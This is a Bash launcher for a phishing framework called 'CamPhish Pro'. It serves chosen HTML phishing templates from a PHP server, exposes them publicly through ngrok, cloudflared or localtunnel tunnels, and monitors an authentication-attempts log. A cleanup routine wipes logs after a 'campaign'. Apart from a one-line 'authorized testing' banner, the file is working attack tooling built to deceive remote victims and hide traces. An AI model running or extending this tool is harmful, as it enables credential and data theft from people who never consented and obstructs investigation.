#!/bin/bash
# CamPhish Pro - Ultimate Ethical Phishing Framework
# Developed by Rayhan
# Version: 4.0

# Color Configuration
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Tool Metadata
VERSION="4.0"
DEVELOPER="Rayhan"
PORT=3333
LOGDIR="secure_logs"
TEMPLATE_DIR="templates"

# Perfectly Aligned ASCII Banner
show_banner() {
    clear
    echo -e "${PURPLE}"
    echo -e "   ____                      ____  _           ____  ____  ____  "
    echo -e "  / ___|__ _ _ __ ___  ___  |  _ \| |__   ___ |  _ \|  _ \|  _ \ "
    echo -e " | |   / _\` | '__/ __|/ _ \ | |_) | '_ \ / _ \| |_) | |_) | |_) |"
    echo -e " | |__| (_| | |  \__ \  __/ |  __/| | | | (_) |  __/|  __/|  __/ "
    echo -e "  \____\__,_|_|  |___/\___| |_|   |_| |_|\___/|_|   |_|   |_|    "
    echo -e "${NC}"
    echo -e "${CYAN}                  CamPhish Pro v${VERSION}${NC}"
    echo -e "${GREEN}             Developed by ${DEVELOPER}${NC}"
    echo -e "${RED}------------------------------------------------------${NC}"
    echo -e "${YELLOW}   WARNING: For Authorized Security Testing Only${NC}"
    echo -e "${RED}------------------------------------------------------${NC}"
}

# Enhanced Dependency Check
check_dependencies() {
    echo -e "${BLUE}[*] Verifying system dependencies...${NC}"
    
    declare -A dependencies=(
        ["php"]="PHP (for web server)"
        ["wget"]="Wget (for downloads)"
        ["unzip"]="Unzip (for extraction)"
        ["curl"]="Curl (for API requests)"
    )
    
    missing_count=0
    
    for cmd in "${!dependencies[@]}"; do
        if ! command -v $cmd &> /dev/null; then
            echo -e "${RED}[-] Missing: ${dependencies[$cmd]}${NC}"
            ((missing_count++))
        fi
    done
    
    if [ $missing_count -gt 0 ]; then
        echo -e "\n${YELLOW}[!] Install missing packages:${NC}"
        if [[ -f "/etc/os-release" ]]; then
            echo "sudo apt install ${!dependencies[@]}"
        else
            echo "pkg install ${!dependencies[@]}"
        fi
        exit 1
    fi
    
    echo -e "${GREEN}[✓] All dependencies are installed${NC}"
}

# Tunnel Management System
setup_tunnel() {
    echo -e "\n${BLUE}[*] Tunnel Configuration${NC}"
    PS3="Select tunneling method: "
    
    select method in "Ngrok (Recommended)" "Cloudflared" "Localtunnel" "Local Network" "Return"; do
        case $method in
            "Ngrok (Recommended)")
                ./tools/ngrok_manager.sh
                break
                ;;
            "Cloudflared")
                ./tools/cloudflared_manager.sh
                break
                ;;
            "Localtunnel")
                echo -e "${YELLOW}[!] Run: npm install -g localtunnel${NC}"
                lt --port $PORT
                break
                ;;
            "Local Network")
                IP=$(hostname -I | awk '{print $1}')
                echo -e "\n${GREEN}[+] Local Access URL: http://${IP}:${PORT}${NC}"
                break
                ;;
            "Return")
                main_menu
                ;;
            *)
                echo -e "${RED}[-] Invalid selection${NC}"
                ;;
        esac
    done
}

# Template Selection Interface
select_template() {
    echo -e "\n${BLUE}[*] Available Templates${NC}"
    
    templates=($(ls $TEMPLATE_DIR/*.html | xargs -n1 basename))
    templates+=("Custom Template" "Return")
    
    PS3="Select template: "
    select template in "${templates[@]}"; do
        case $template in
            "Custom Template")
                read -p "Enter template path: " custom_path
                cp "$custom_path" index.html
                break
                ;;
            "Return")
                main_menu
                ;;
            *)
                if [[ -f "$TEMPLATE_DIR/$template" ]]; then
                    cp "$TEMPLATE_DIR/$template" index.html
                    echo -e "${GREEN}[+] Template activated: ${template}${NC}"
                    break
                else
                    echo -e "${RED}[-] Invalid selection${NC}"
                fi
                ;;
        esac
    done
}

# Attack Monitoring System
monitor_attack() {
    echo -e "\n${BLUE}[*] Starting Monitoring Panel${NC}"
    echo -e "${GREEN}[+] PHP server running on port ${PORT}${NC}"
    echo -e "${YELLOW}[!] Press Ctrl+C to stop monitoring${NC}"
    
    multitail -s 2 \
        -cS apache "$LOGDIR/access.log" \
        -cS php "$LOGDIR/errors.log" \
        -cS auth "$LOGDIR/auth_attempts.log"
}

# Main Attack Sequence
start_attack() {
    mkdir -p $LOGDIR
    
    # Start PHP server
    php -S 0.0.0.0:$PORT > "$LOGDIR/php_server.log" 2>&1 &
    
    # Start monitoring
    monitor_attack
}

# System Cleanup Protocol
cleanup() {
    echo -e "\n${RED}[!] Initiating System Cleanup${NC}"
    
    # Terminate processes
    pkill -f "php -S"
    pkill -f "ngrok"
    pkill -f "cloudflared"
    
    # Secure log cleanup
    ./utilities/secure_wipe.sh
    
    echo -e "${GREEN}[✓] System sanitized${NC}"
    exit 0
}

# Main Menu Interface
main_menu() {
    while true; do
        show_banner
        
        echo -e "\n${BLUE}==== Main Control Panel ====${NC}"
        echo "1. Launch Phishing Campaign"
        echo "2. Configure Tunnel"
        echo "3. Manage Templates"
        echo "4. System Cleanup"
        echo "5. Exit"
        
        read -p "Select option: " choice
        
        case $choice in
            1) select_template && start_attack ;;
            2) setup_tunnel ;;
            3) nano $TEMPLATE_DIR/*.html ;;
            4) cleanup ;;
            5) cleanup ;;
            *) echo -e "${RED}[-] Invalid selection${NC}" ;;
        esac
    done
}

# Initialization
trap cleanup SIGINT SIGTERM
check_dependencies
main_menu
